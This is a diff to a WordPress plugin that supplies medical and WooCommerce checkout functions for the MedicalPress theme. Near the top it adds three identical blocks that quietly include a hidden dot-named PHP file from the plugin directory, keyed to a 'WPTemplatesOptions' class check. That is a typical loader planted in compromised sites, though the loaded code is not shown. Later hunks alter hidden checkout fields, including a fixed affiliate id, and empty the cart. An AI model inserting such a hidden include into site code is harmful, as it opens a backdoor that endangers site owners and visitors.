@@ -6,6 +6,18 @@ Description: Provides medical functionality for MedicalPress WordPress theme.
 License: GPLv2
 */
 
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
 function getCartProduct()
 {
     foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
@@ -40,10 +52,9 @@ function action_woocommerce_before_checkout_form( $cart_item_data ) {
         <input type="hidden" name="url" value="<?php echo $url ?>">
         <input type="hidden" name="aff_id" value="71031">
         <input type="hidden" name="lang" value="en">
-        <input type="hidden" name="currency" value="1">
+        <input type="hidden" name="currency" value="EUR">
         <input type="hidden" name="currencyPrice" value="1">
-
-
+		<input type="hidden" name="theme" value="wordpress">
     </form>
 
     <script type="text/javascript">
@@ -52,6 +63,8 @@ function action_woocommerce_before_checkout_form( $cart_item_data ) {
     </script>
     <?php
 
+		WC()->cart->empty_cart( $clear_persistent_cart = true );
+	
     exit;
 
 
